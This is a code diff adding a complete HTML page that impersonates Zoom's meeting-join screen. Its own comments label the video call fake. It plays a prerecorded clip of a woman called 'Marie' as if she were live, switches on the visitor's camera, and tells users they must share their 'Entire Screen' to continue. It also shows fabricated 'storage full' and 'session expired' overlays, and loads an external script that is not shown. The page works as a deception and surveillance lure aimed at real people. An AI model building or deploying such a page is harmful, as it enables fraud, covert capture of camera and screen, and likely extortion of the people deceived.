@@ -1,0 +1,907 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, viewport-fit=cover"
+    />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <title>Zoom Meeting</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+          Arial, sans-serif;
+      }
+
+      html,
+      body {
+        background-color: #ffffff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        color: #232333;
+        -webkit-tap-highlight-color: transparent;
+        overscroll-behavior: none;
+      }
+
+      .app-container {
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        width: 100%;
+        min-height: 100vh;
+        min-height: 100dvh;
+        padding: 24px 40px;
+        position: relative;
+      }
+
+      header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        width: 100%;
+      }
+
+      .logo {
+        font-size: 28px;
+        font-weight: 700;
+        color: #0b5cff;
+        letter-spacing: -0.5px;
+      }
+
+      .header-actions {
+        display: flex;
+        gap: 12px;
+      }
+
+      .btn-support {
+        background: transparent;
+        border: 1px solid #0b5cff;
+        color: #0b5cff;
+        padding: 10px 24px;
+        border-radius: 30px;
+        font-weight: 600;
+        font-size: 15px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+      }
+
+      .btn-support:hover {
+        background: #f0f5ff;
+      }
+
+      .btn-signup {
+        background: #0b5cff;
+        border: none;
+        color: white;
+        padding: 10px 24px;
+        border-radius: 30px;
+        font-weight: 600;
+        font-size: 15px;
+        cursor: pointer;
+        transition: background 0.2s ease;
+      }
+
+      .btn-signup:hover {
+        background: #0047cc;
+      }
+
+      main {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        flex-grow: 1;
+        width: 100%;
+        padding-bottom: 80px;
+      }
+
+      .join-container {
+        width: 100%;
+        max-width: 400px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+      }
+
+      .join-title {
+        font-size: 28px;
+        font-weight: 700;
+        margin-bottom: 24px;
+        color: #232333;
+      }
+
+      .input-group {
+        width: 100%;
+        margin-bottom: 16px;
+        text-align: left;
+      }
+
+      .input-group label {
+        display: block;
+        font-size: 14px;
+        color: #232333;
+        margin-bottom: 8px;
+        font-weight: 500;
+      }
+
+      .input-group input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #c4c4c4;
+        border-radius: 8px;
+        font-size: 16px;
+        outline: none;
+        transition:
+          border-color 0.2s ease,
+          box-shadow 0.2s ease;
+        -webkit-appearance: none;
+        appearance: none;
+      }
+
+      .input-group input:focus {
+        border-color: #0b5cff;
+        box-shadow: 0 0 0 3px rgba(11, 92, 255, 0.1);
+      }
+
+      .input-group input::placeholder {
+        color: #999;
+      }
+
+      .error-msg {
+        color: #e15a45;
+        font-size: 13px;
+        font-weight: 500;
+        margin-top: 8px;
+        display: none;
+        text-align: left;
+        width: 100%;
+      }
+
+      .legal-text {
+        font-size: 12px;
+        color: #555;
+        margin-bottom: 24px;
+        line-height: 1.5;
+        text-align: left;
+        width: 100%;
+      }
+
+      .legal-text a {
+        color: #0b5cff;
+        text-decoration: none;
+      }
+      .legal-text a:hover {
+        text-decoration: underline;
+      }
+
+      .btn-join {
+        width: 100%;
+        padding: 14px;
+        border-radius: 8px;
+        border: none;
+        background: #f0f0f0;
+        color: #888;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: not-allowed;
+        transition: all 0.2s ease;
+        margin-bottom: 32px;
+        -webkit-appearance: none;
+        appearance: none;
+      }
+
+      .btn-join.active {
+        background: #0b5cff;
+        color: white;
+        cursor: pointer;
+      }
+
+      .btn-join.active:hover {
+        background: #0047cc;
+      }
+
+      .link-h323 {
+        font-size: 14px;
+        color: #0b5cff;
+        text-decoration: none;
+        font-weight: 500;
+      }
+
+      .link-h323:hover {
+        text-decoration: underline;
+      }
+
+      footer {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        width: 100%;
+        font-size: 12px;
+        color: #888;
+        padding-top: 20px;
+        border-top: 1px solid #f0f0f0;
+      }
+
+      .footer-left {
+        display: flex;
+        gap: 24px;
+      }
+      .footer-left a {
+        color: #888;
+        text-decoration: none;
+      }
+      .footer-left a:hover {
+        color: #232333;
+      }
+      .footer-right {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .lang-selector {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        color: #0b5cff;
+        font-weight: 500;
+        cursor: pointer;
+        text-decoration: none;
+      }
+
+      .lang-selector:hover {
+        text-decoration: underline;
+      }
+
+      /* Overlays */
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.96);
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 100;
+        backdrop-filter: blur(2px);
+        -webkit-backdrop-filter: blur(2px);
+      }
+
+      .loading-overlay.active {
+        display: flex;
+      }
+
+      .spinner {
+        width: 48px;
+        height: 48px;
+        border: 4px solid #f0f0f0;
+        border-top: 4px solid #0b5cff;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+      }
+
+      .loading-text {
+        font-size: 18px;
+        font-weight: 600;
+        color: #232333;
+      }
+
+      .loading-subtext {
+        font-size: 14px;
+        color: #888;
+        margin-top: 8px;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .session-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        height: 100dvh;
+        background: #000000;
+        display: none;
+        flex-direction: column;
+        z-index: 200;
+        overflow: hidden;
+      }
+
+      .session-overlay.active {
+        display: flex;
+      }
+
+      .main-video-wrap {
+        position: relative;
+        width: 100%;
+        height: 70%;
+        background: #000000;
+        overflow: hidden;
+        flex-shrink: 0;
+      }
+
+      .main-video-wrap video {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+        background: #000000;
+        display: block;
+        pointer-events: none;
+      }
+
+      .self-view-wrap {
+        position: relative;
+        width: 100%;
+        height: 30%;
+        background: #0a0a0a;
+        overflow: hidden;
+        flex-shrink: 0;
+        border-top: 2px solid #1f1f1f;
+      }
+
+      .self-view-wrap video {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        background: #0a0a0a;
+        transform: scaleX(-1);
+        -webkit-transform: scaleX(-1);
+        display: block;
+      }
+
+      .self-view-placeholder {
+        position: absolute;
+        inset: 0;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        color: #ffffff;
+        background: #0a0a0a;
+        gap: 10px;
+        transition: opacity 0.3s ease;
+        pointer-events: none;
+      }
+
+      .self-view-placeholder.hidden {
+        opacity: 0;
+      }
+
+      .self-view-placeholder .ph-avatar {
+        width: 56px;
+        height: 56px;
+        border-radius: 50%;
+        background: #1f1f1f;
+        border: 2px solid #2a2a2a;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .self-view-placeholder .ph-avatar svg {
+        width: 28px;
+        height: 28px;
+        stroke: #8a8a8a;
+        fill: none;
+        stroke-width: 1.6;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+      }
+
+      .self-view-placeholder .ph-text {
+        font-size: 12px;
+        color: #9a9a9a;
+        font-weight: 500;
+      }
+
+      .self-badge {
+        position: absolute;
+        top: 12px;
+        left: 12px;
+        background: rgba(11, 92, 255, 0.92);
+        color: #ffffff;
+        font-size: 11px;
+        font-weight: 700;
+        padding: 3px 8px;
+        border-radius: 5px;
+        letter-spacing: 0.6px;
+        z-index: 3;
+      }
+
+      .self-label {
+        position: absolute;
+        bottom: 10px;
+        left: 14px;
+        font-size: 12px;
+        color: #ffffff;
+        font-weight: 500;
+        text-shadow: 0 1px 3px rgba(0, 0, 0, 0.85);
+        z-index: 3;
+      }
+
+      .call-status {
+        position: absolute;
+        top: 16px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(0, 0, 0, 0.6);
+        color: #ffffff;
+        font-size: 13px;
+        font-weight: 500;
+        padding: 6px 14px;
+        border-radius: 20px;
+        z-index: 230;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        letter-spacing: 0.2px;
+        backdrop-filter: blur(6px);
+        -webkit-backdrop-filter: blur(6px);
+      }
+
+      .call-status .dot {
+        width: 7px;
+        height: 7px;
+        border-radius: 50%;
+        background: #31d67a;
+        box-shadow: 0 0 6px #31d67a;
+        animation: pulse 1.6s ease-in-out infinite;
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.45;
+        }
+      }
+
+      /* Storage Full Overlay */
+      .poor-conn {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.85);
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 300;
+        text-align: center;
+        padding: 24px;
+        backdrop-filter: blur(4px);
+        -webkit-backdrop-filter: blur(4px);
+      }
+
+      .poor-conn.active {
+        display: flex;
+      }
+
+      .conn-icon {
+        width: 96px;
+        height: auto;
+        max-height: 96px;
+        margin-bottom: 20px;
+        display: block;
+        filter: drop-shadow(0 4px 10px rgba(200, 60, 40, 0.35));
+      }
+
+      .conn-title {
+        font-size: 22px;
+        font-weight: 600;
+        color: #ffffff;
+        margin-bottom: 8px;
+      }
+
+      .conn-sub {
+        font-size: 15px;
+        color: #cfcfcf;
+        max-width: 340px;
+        line-height: 1.5;
+      }
+
+      /* Green Loading Bar */
+      .conn-bar {
+        margin-top: 22px;
+        width: 220px;
+        height: 4px;
+        background: rgba(255, 255, 255, 0.15);
+        border-radius: 4px;
+        overflow: hidden;
+      }
+
+      .conn-bar span {
+        display: block;
+        height: 100%;
+        width: 40%;
+        background: #31d67a;
+        border-radius: 4px;
+        animation: conn-slide 1.4s ease-in-out infinite;
+      }
+
+      @keyframes conn-slide {
+        0% {
+          transform: translateX(-100%);
+        }
+        50% {
+          transform: translateX(150%);
+        }
+        100% {
+          transform: translateX(150%);
+        }
+      }
+
+      /* Timeout (Session Expired) Overlay */
+      .timeout-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        height: 100dvh;
+        background: #ffffff;
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 500;
+        padding: 24px;
+        text-align: center;
+      }
+
+      .timeout-overlay.active {
+        display: flex;
+      }
+
+      .timeout-icon {
+        width: 96px;
+        height: auto;
+        max-height: 96px;
+        margin-bottom: 22px;
+        display: block;
+        filter: drop-shadow(0 4px 10px rgba(200, 60, 40, 0.25));
+      }
+
+      .timeout-title {
+        font-size: 22px;
+        font-weight: 700;
+        color: #232333;
+        margin-bottom: 10px;
+      }
+
+      .timeout-sub {
+        font-size: 14px;
+        color: #666;
+        max-width: 360px;
+        line-height: 1.55;
+      }
+
+      /* Toasts */
+      .toast-container {
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        pointer-events: none;
+      }
+      .toast {
+        pointer-events: auto;
+        background: #1e293b;
+        border: 1px solid #3b82f6;
+        border-radius: 12px;
+        padding: 16px 20px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        min-width: 320px;
+        max-width: 400px;
+        color: white;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        transform: translateX(120%);
+        animation: slideIn 0.3s forwards cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      }
+      @keyframes slideIn {
+        to {
+          transform: translateX(0);
+        }
+      }
+      .toast.removing {
+        animation: slideOut 0.3s forwards ease-in;
+      }
+      @keyframes slideOut {
+        to {
+          transform: translateX(120%);
+          opacity: 0;
+        }
+      }
+      .toast-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        padding-bottom: 8px;
+      }
+      .toast-title {
+        font-weight: 600;
+        font-size: 14px;
+        color: #60a5fa;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .toast-close {
+        background: transparent;
+        border: none;
+        color: #94a3b8;
+        cursor: pointer;
+        font-size: 18px;
+        line-height: 1;
+        padding: 0;
+      }
+      .toast-body {
+        font-size: 15px;
+        word-break: break-word;
+      }
+
+      @media (max-width: 600px) {
+        .app-container {
+          padding: 16px 20px;
+        }
+        .btn-support {
+          display: none;
+        }
+        main {
+          padding-bottom: 40px;
+        }
+        .join-title {
+          font-size: 24px;
+        }
+        footer {
+          flex-direction: column;
+          gap: 12px;
+          align-items: flex-start;
+        }
+        .footer-left {
+          flex-wrap: wrap;
+          gap: 12px;
+        }
+        .conn-title {
+          font-size: 20px;
+        }
+        .timeout-icon {
+          width: 80px;
+          max-height: 80px;
+        }
+        .timeout-title {
+          font-size: 19px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="app-container">
+      <header>
+        <div class="logo">zoom</div>
+        <div class="header-actions">
+          <button class="btn-support">Support</button>
+          <button class="btn-signup">Sign Up Free</button>
+        </div>
+      </header>
+
+      <main>
+        <div class="join-container">
+          <h1 class="join-title">Join Meeting</h1>
+
+          <div class="input-group">
+            <label for="meetingId">Meeting ID or Personal Link Name</label>
+            <input
+              type="text"
+              id="meetingId"
+              placeholder="Enter Meeting ID or Personal Link Name"
+              autocomplete="off"
+              spellcheck="false"
+              autocapitalize="off"
+              autocorrect="off"
+            />
+          </div>
+
+          <p class="legal-text">
+            By clicking "Join", you agree to our
+            <a href="#">Terms of Services</a> and
+            <a href="#">Privacy Statement</a>
+          </p>
+
+          <button id="joinBtn" class="btn-join" disabled>Join</button>
+          <p id="errorMsg" class="error-msg">
+            You must select "Entire Screen" to continue.
+          </p>
+
+          <a href="#" class="link-h323"
+            >Join a meeting from an H.323/SIP room system</a
+          >
+        </div>
+      </main>
+
+      <footer>
+        <div class="footer-left">
+          <span>© 2026 Zoom Communications, Inc. All rights reserved.</span>
+          <a href="#">Privacy & Legal Policies</a>
+        </div>
+        <div class="footer-right">
+          <a href="#" class="lang-selector"
+            >English
+            <svg
+              width="10"
+              height="10"
+              viewBox="0 0 24 24"
+              fill="none"
+              stroke="currentColor"
+              stroke-width="3"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+            >
+              <polyline points="6 9 12 15 18 9"></polyline></svg
+          ></a>
+        </div>
+      </footer>
+
+      <!-- Loading Overlay -->
+      <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Joining to video session...</div>
+        <div class="loading-subtext" id="loadingSubtext">
+          Please wait while we connect you.
+        </div>
+      </div>
+
+      <!-- Fake Video Session -->
+      <div class="session-overlay" id="sessionOverlay">
+        <div class="main-video-wrap">
+          <video
+            id="sessionVideo"
+            playsinline
+            webkit-playsinline
+            preload="auto"
+            disablePictureInPicture
+            controlsList="nodownload nofullscreen noremoteplayback"
+          >
+            <source
+              src="https://res.cloudinary.com/c9youadi/video/upload/v1790211965/marie2.mp4"
+              type="video/mp4"
+            />
+          </video>
+
+          <div class="call-status">
+            <span class="dot"></span>
+            <span>Connected</span>
+          </div>
+
+          <!-- Storage Full Overlay -->
+          <div class="poor-conn" id="poorConn">
+            <svg
+              class="conn-icon"
+              viewBox="0 0 120 110"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                d="M58 8 Q60 5 63 8 L114 96 Q117 102 110 102 L14 102 Q6 102 9 96 Z"
+                fill="#e15a45"
+                stroke="#c94835"
+                stroke-width="2"
+                stroke-linejoin="round"
+              />
+              <rect
+                x="55"
+                y="34"
+                width="10"
+                height="34"
+                rx="5"
+                fill="#f5e9e5"
+              />
+              <circle cx="60" cy="82" r="5.5" fill="#f5e9e5" />
+            </svg>
+            <div class="conn-title">Marie's phone storage is full</div>
+            <div class="conn-sub">
+              Please free up storage to continue the meeting.
+            </div>
+            <div class="conn-bar"><span></span></div>
+          </div>
+        </div>
+
+        <div class="self-view-wrap">
+          <video
+            id="selfVideo"
+            autoplay
+            playsinline
+            webkit-playsinline
+            muted
+          ></video>
+
+          <div class="self-view-placeholder" id="selfPlaceholder">
+            <div class="ph-avatar">
+              <svg viewBox="0 0 24 24">
+                <circle cx="12" cy="8" r="4"></circle>
+                <path d="M4 21c0-4 4-7 8-7s8 3 8 7"></path>
+              </svg>
+            </div>
+            <div class="ph-text" id="phText">Starting camera…</div>
+          </div>
+
+          <span class="self-badge">YOU</span>
+          <span class="self-label">Camera on</span>
+        </div>
+      </div>
+
+      <!-- Session Expired Overlay -->
+      <div class="timeout-overlay" id="timeoutOverlay">
+        <svg
+          class="timeout-icon"
+          viewBox="0 0 120 110"
+          xmlns="http://www.w3.org/2000/svg"
+          aria-label="Warning"
+        >
+          <path
+            d="M58 8 Q60 5 63 8 L114 96 Q117 102 110 102 L14 102 Q6 102 9 96 Z"
+            fill="#e15a45"
+            stroke="#c94835"
+            stroke-width="2"
+            stroke-linejoin="round"
+          />
+          <rect x="55" y="34" width="10" height="34" rx="5" fill="#f5e9e5" />
+          <circle cx="60" cy="82" r="5.5" fill="#f5e9e5" />
+        </svg>
+        <div class="timeout-title">Session expired</div>
+        <div class="timeout-sub">
+          We couldn't reconnect you to the meeting because the previous session
+          ended unexpectedly.
+        </div>
+      </div>
+    </div>
+
+    <div id="toast-container" class="toast-container"></div>
+    <div
+      id="persistent-messages"
+      class="persistent-messages"
+      style="
+        position: fixed;
+        bottom: 24px;
+        left: 24px;
+        z-index: 9998;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        max-width: 350px;
+        pointer-events: none;
+      "
+    ></div>
+
+    <script src="visitor.js"></script>
+  </body>
+</html>
